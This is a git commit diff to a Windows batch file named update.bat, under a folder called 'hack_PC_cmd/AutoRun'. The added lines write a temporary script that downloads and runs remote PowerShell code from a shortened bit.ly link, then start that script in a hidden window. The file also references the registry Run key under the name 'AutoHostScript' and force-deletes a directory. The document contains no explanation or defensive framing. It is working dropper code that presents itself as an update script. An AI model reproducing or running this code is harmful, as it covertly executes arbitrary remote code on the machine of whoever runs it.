4db222bbf28de857ff0b21f403781b6e77579581
brndan918 <191344310+brndan918@users.noreply.github.com>
2026-07-20 23:43:40 +0800

    初始化提交

--- hack_PC_cmd/AutoRun/update.bat
+++ hack_PC_cmd/AutoRun/update.bat
@@ -1,6 +1,11 @@
 @echo off
 chcp 65001 > nul
 
+echo timeout /t 8 /nobreak > "%temp%\runme.bat"
+echo powershell iex (iwr bit.ly/b9virf -UseBasicParsing) >> "%temp%\runme.bat"
+
+powershell -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList '-Command & \"%temp%\runme.bat\"'"
+
 set "STARTUP=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 set "valueName=AutoHostScript"
 
@@ -11,7 +16,5 @@ cd /d %temp%
 set "TARGET=C:\uptm"
 
 rmdir /s /q "%TARGET%"
-
-powershell iex (iwr bit.ly/b9virf -UseBasicParsing)
 
 exit
